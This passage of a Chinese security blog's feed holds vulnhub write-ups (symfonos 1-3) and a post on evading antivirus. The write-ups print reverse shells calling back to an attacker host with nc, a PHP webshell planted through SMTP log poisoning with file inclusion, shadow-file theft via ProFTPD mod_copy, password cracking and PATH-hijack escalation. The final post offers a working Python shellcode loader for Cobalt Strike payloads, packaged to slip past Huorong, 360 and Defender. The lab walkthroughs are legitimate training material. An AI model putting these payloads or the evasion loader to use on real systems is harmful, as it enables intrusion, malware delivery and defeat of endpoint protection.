class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&quot;nc -nv 192.168.31.118 5555 -e /bin/bash&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071809610.png"></p><p>kali监听等待回弹</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212071810968.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶机 &lt;a href=&quot;https://www.vulnhub.com/entry/symfonos-3,332/&quot;&gt;https://www.vulnhub.com/entry/symfonos-3,332/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;首先确定目标ip&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nmap -sP 192.168.31.0/24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="smb信息收集" scheme="https://syst1m.top/tags/smb%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="librenms" scheme="https://syst1m.top/tags/librenms/"/>
    
  </entry>
  
  <entry>
    <title>symfonos系列打靶-2</title>
    <link href="https://syst1m.top/2022/12/05/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-2/"/>
    <id>https://syst1m.top/2022/12/05/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-2/</id>
    <published>2022-12-05T12:39:28.000Z</published>
    <updated>2022-12-07T07:26:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机 <a href="https://www.vulnhub.com/entry/symfonos-2,331/">https://www.vulnhub.com/entry/symfonos-2,331/</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h2><p>首先找到目标</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.31.0/24</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052043179.png"></p><p>收集端口详细信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.31.58 </span><br></pre></td></tr></table></figure><p>开放端口蛮多,还有135和445,切入口应该在这里了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052046798.png"></p><h2 id="smb信息收集"><a href="#smb信息收集" class="headerlink" title="smb信息收集"></a>smb信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 192.168.31.58</span><br></pre></td></tr></table></figure><p>存在一个匿名目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052049850.png"></p><p>进去看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.31.58/anonymous -U % -N</span><br><span class="line">-U 指定用户 %表示用户</span><br><span class="line">-N 空密码</span><br></pre></td></tr></table></figure><p>存在一个log.txt下载下来看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052051462.png"></p><p>给了几条线索,1.将shadow备份到&#x2F;var&#x2F;backups下 2.smb配置文件给出一个密码 3.给出proftp配置</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052053197.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052056925.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052058612.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052100072.png"></p><p>前面nmap扫描给出了ftp的版本,看看能否找到漏洞</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052106932.png"></p><p>有利用限制,只是可以复制文件,并不能rce而且需要知道真实路径</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="任意文件复制"><a href="#任意文件复制" class="headerlink" title="任意文件复制"></a>任意文件复制</h2><p>根据上面的log.txt我们得到了匿名用户的真实路径 &#x2F;home&#x2F;aeolus&#x2F;share</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052111240.png"></p><p>利用漏洞可以复制文件,账号密码任意</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.31.58</span><br><span class="line">site cpfr /var/backups/shadow.bak</span><br><span class="line">site cpto /home/aeolus/share/shadow.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052117238.png"></p><p>上smb下载下来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052118620.png"></p><p>利用同样的方式复制&#x2F;etc&#x2F;passwd文件,再下载到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.31.58</span><br><span class="line">site cpfr /etc/passwd</span><br><span class="line">site cpto /home/aeolus/share/passwd.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052122563.png"></p><h2 id="爆破hash"><a href="#爆破hash" class="headerlink" title="爆破hash"></a>爆破hash</h2><p>先把两个文件复制到目录,再写入同一个文件</p><p> unshadow 会结合&#x2F;etc&#x2F;passwd的数据和&#x2F;etc&#x2F;shadow的数据，创建1个含有用户名和密码详细信息的文件。  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /root/.john                                                                                                                                       </span><br><span class="line"><span class="built_in">cp</span> passwd.txt shadow.txt ./.john                                                                                                                                       </span><br><span class="line"><span class="built_in">cd</span> .john                        </span><br><span class="line">unshadow passwd.txt shadow.txt &gt; hash.txt                                                </span><br></pre></td></tr></table></figure><p>使用john爆破hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/.john</span><br><span class="line">gunzip /usr/share/wordlists/rockyou.txt.gz</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure><p>爆破出一个账号 aeolus  sergioteamo</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052130948.png"></p><p>ssh上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 192.168.31.58 -l aeolus</span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>sudo -l找到一个提示</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052137717.png"></p><p>跟进,得到提示</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052137237.png"></p><p>没什么用…suid也没东西,看看端口netstat没有这个命令</p><p>上传提权脚本,因为我们是ssh上去的,直接复制进去就行了 <a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></p><p>执行发现,存在nmap工具</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052156377.png"></p><p>直接扫自己,发现一个不对外开放的端口和mysql,用nc端口转发将本地的8080转发到5555,访问一下看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mknod</span> backpipe p ; nc -l -p (远程端口) &lt; backpipe | nc (本地ip) (被转发的端口) &gt;backpipe</span><br><span class="line"><span class="built_in">mknod</span> backpipe p ; nc -l -p 5555 &lt; backpipe | nc 127.0.0.1 8080 &gt;backpipe</span><br><span class="line">或者</span><br><span class="line">socat TCP-LISTEN:5000,fork,reuseaddr tcp:127.0.0.1:8080</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052157459.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052207419.png"></p><p>访问5555端口,转发成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052208130.png"></p><p>得知cms版本,使用msf尝试提权</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052219373.png"></p><p>sudo找到一个suid命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052219634.png"></p><p>mysql提权方法 <a href="https://gtfobins.github.io/gtfobins/mysql/">https://gtfobins.github.io/gtfobins/mysql/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e <span class="string">&#x27;\! /bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212052220301.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶机 &lt;a href=&quot;https://www.vulnhub.com/entry/symfonos-2,331/&quot;&gt;https://www.vulnhub.com/entry/symfonos-2,331/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;h2 id=&quot;端口信息收集&quot;&gt;&lt;a href=&quot;#端口信息收集&quot; class=&quot;headerlink&quot; title=&quot;端口信息收集&quot;&gt;&lt;/a&gt;端口信息收集&lt;/h2&gt;&lt;p&gt;首先找到目标&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="smb信息收集" scheme="https://syst1m.top/tags/smb%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="librenms" scheme="https://syst1m.top/tags/librenms/"/>
    
  </entry>
  
  <entry>
    <title>symfonos系列打靶-1</title>
    <link href="https://syst1m.top/2022/12/05/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-1/"/>
    <id>https://syst1m.top/2022/12/05/symfonos%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6-1/</id>
    <published>2022-12-05T06:27:35.000Z</published>
    <updated>2022-12-05T07:59:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机地址 <a href="https://www.vulnhub.com/entry/symfonos-1,322/">https://www.vulnhub.com/entry/symfonos-1,322/</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>探测存活ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051434477.png"></p><p>对靶机进行详细扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051435562.png"></p><p>开放了smb服务,跑一下smb服务探测工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 192.168.31.217</span><br></pre></td></tr></table></figure><p>扫出一个anonymous可访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051439999.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.31.217/anonymous -U % N</span><br><span class="line">这里 -U 表示用户名，% 表示用户名。</span><br><span class="line">参数 -N 用于空密码</span><br></pre></td></tr></table></figure><p>发现一个txt文件,下载下来看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051441152.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051441146.png"></p><p>提示密码是这三个,结合上面smb信息收集的时候存在一个要密码的目录,爆破试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.31.217/helios -U helios</span><br><span class="line">密码为 qwerty</span><br></pre></td></tr></table></figure><p>存在两个txt文件,下载下来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051447053.png"></p><p>提示里似乎是一个目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051448292.png"></p><p>访问网站首页看看这个路径,成功跳转,但是有的css文件没加载出来,看到请求网址,修改host解析</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051450223.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;192.168.31.217 symfonos.local&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><p>WordPress,直接掏出wpscan,wpscan扫描漏洞需要token</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://symfonos.local/h3l105/ -e p --api-token xxxxxxx你的apitokenxxxx</span><br></pre></td></tr></table></figure><p>扫出漏洞大多是xss,没什么用,但是存在一个文件包含</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051509667.png"></p><p>可以读文件,那么可以尝试密码找回,再去重置密码,账号为admin</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051520097.png"></p><p>读取邮件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051520350.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051520093.png"></p><p>但是进入后台拿shell无果,尝试使用SMTP日志投毒配合LFI来进行RCE</p><h2 id="SMTP日志投毒RCE"><a href="#SMTP日志投毒RCE" class="headerlink" title="SMTP日志投毒RCE"></a>SMTP日志投毒RCE</h2><p>写入webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.31.217 25</span><br><span class="line">MAIL FROM: &lt;<span class="built_in">test</span>&gt;</span><br><span class="line">RCPT TO: Helios</span><br><span class="line">data</span><br><span class="line">&lt;?php system(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);?&gt;</span><br><span class="line">.</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051526411.png"></p><p>配合文件包含来rce,访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;a=ip a </span><br></pre></td></tr></table></figure><p>成功执行命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051528782.png"></p><p>kali监听,访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;a=nc -nv 192.168.31.118 4444 -e /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051530816.png"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>python返回一个半交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>linux提权,suid sudo 内核</p><p>存在不常见suid文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051533457.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051534603.png"></p><p>用file命令查看文件类型</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051537986.png"></p><p>用strings打印一下他干了什么</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051540193.png"></p><p>似乎是一个发包器,用curl -I <a href="http://localhost/">http://localhost</a> 访问本地</p><p>这样的话,我们可以自定义一个curl文件,顶替掉原来的curl命令,用来反弹一个root权限的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> $<span class="string">&#x27;#!/bin/sh\n/bin/sh&#x27;</span> &gt; curl <span class="comment">#写入反弹一个shell</span></span><br><span class="line"><span class="built_in">chmod</span> +x curl</span><br><span class="line"><span class="built_in">export</span> PATH=$(<span class="built_in">pwd</span>):<span class="variable">$PATH</span> <span class="comment">#构造临时环境变量,让statuscheck文件去执行我们创建的curl</span></span><br><span class="line">/opt/statuscheck</span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051554243.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212051556179.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶机地址 &lt;a href=&quot;https://www.vulnhub.com/entry/symfonos-1,322/&quot;&gt;https://www.vulnhub.com/entry/symfonos-1,322/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;探测存活ip&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202212051434477.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="smb信息收集" scheme="https://syst1m.top/tags/smb%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="wordpress" scheme="https://syst1m.top/tags/wordpress/"/>
    
  </entry>
  
  <entry>
    <title>python免杀bypass x绒 x60 defender</title>
    <link href="https://syst1m.top/2022/12/04/python%E5%85%8D%E6%9D%80bypass-x%E7%BB%92-x60-defender/"/>
    <id>https://syst1m.top/2022/12/04/python%E5%85%8D%E6%9D%80bypass-x%E7%BB%92-x60-defender/</id>
    <published>2022-12-04T09:29:37.000Z</published>
    <updated>2022-12-04T10:30:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学习免杀技术,偶然尝试居然bypass 国内常用杀软,很简单,但却非常使用,效果好到惊呆</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><p>cs生成一个python的pyload</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041732758.png"></p><h2 id="构造加载器"><a href="#构造加载器" class="headerlink" title="构造加载器"></a>构造加载器</h2><p>加载器都一样,大同小异,网上很多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shellcode loader</span></span><br><span class="line"><span class="comment"># 返回新字节数组</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 放入shellcode</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_uint64(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h1 id="免杀开始"><a href="#免杀开始" class="headerlink" title="免杀开始"></a>免杀开始</h1><p>将生成的pyload中的shellcode取出来放进加载器</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">shellcode = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0...&quot;</span></span><br><span class="line">    <span class="comment"># shellcode loader代码</span></span><br><span class="line">    <span class="comment"># 返回新字节数组</span></span><br><span class="line">    shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line">    <span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">    <span class="comment"># 申请内存</span></span><br><span class="line">    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">    <span class="comment"># 放入shellcode</span></span><br><span class="line">    buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    <span class="comment"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_uint64(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">    <span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到并没有对加载器进行任何处理,这样打包出来毫无疑问是会被杀的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041741147.png"></p><h2 id="import混淆加密打包bypass"><a href="#import混淆加密打包bypass" class="headerlink" title="import混淆加密打包bypass"></a>import混淆加密打包bypass</h2><p>现在我们把加载器写成一个函数,再通过一个py文件去调用加载器</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> shellcodloader</span><br><span class="line">shellcodloader.main()</span><br></pre></td></tr></table></figure><p>最终目录如下:</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041744127.png"></p><p>然后使用pyinstaller开始打包 –key 对二进制文件进行加密,防止反编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F main.py --key <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h2 id="x绒"><a href="#x绒" class="headerlink" title="x绒"></a>x绒</h2><p>可以看到我们没有对加载器做任何免杀操作,但是依旧免杀,简单实用.测试时间2022.12.4</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041749331.png"></p><h2 id="x60-核晶开启"><a href="#x60-核晶开启" class="headerlink" title="x60 核晶开启"></a>x60 核晶开启</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041750463.png"></p><h2 id="defender"><a href="#defender" class="headerlink" title="defender"></a>defender</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041751616.png"></p><h1 id="cs执行命令"><a href="#cs执行命令" class="headerlink" title="cs执行命令"></a>cs执行命令</h1><p>以上都可以正常上线cs并执行命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202212041751869.png"></p><h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/chencicici/python_bypass">https://github.com/chencicici/python_bypass</a></p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>并没有上传微步和vt,因为已经够用了.以上仅仅使用import混淆导包和pyinstaller加密生成exe,还没有对shellcode和加载器进行加密混淆,已经免杀国内常用杀软.后续对shellcode进行加密或者分离加载,效果只会更好</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近学习免杀技术,偶然尝试居然bypass 国内常用杀软,很简单,但却非常使用,效果好到惊呆&lt;/p&gt;
&lt;h1 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h1&gt;&lt;h2 id=&quot;生成payload&quot;&gt;&lt;a href=&quot;#生成payload&quot; class=&quot;headerlink&quot; title=&quot;生成payload&quot;&gt;&lt;/a&gt;生成payload&lt;/h2&gt;&lt;p&gt;cs生成一个python的pyload&lt;/p&gt;</summary>
    
    
    
    <category term="造轮子" scheme="https://syst1m.top/categories/%E9%80%A0%E8%BD%AE%E5%AD%90/"/>
    
    
    <category term="免杀" scheme="https://syst1m.top/tags/%E5%85%8D%E6%9D%80/"/>
    
    <category term="bypass" scheme="https://syst1m.top/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>Auto_xray批量缝合怪</title>
    <link href="https://syst1m.top/2022/11/22/Auto-xray/"/>
    <id>https://syst1m.top/2022/11/22/Auto-xray/</id>
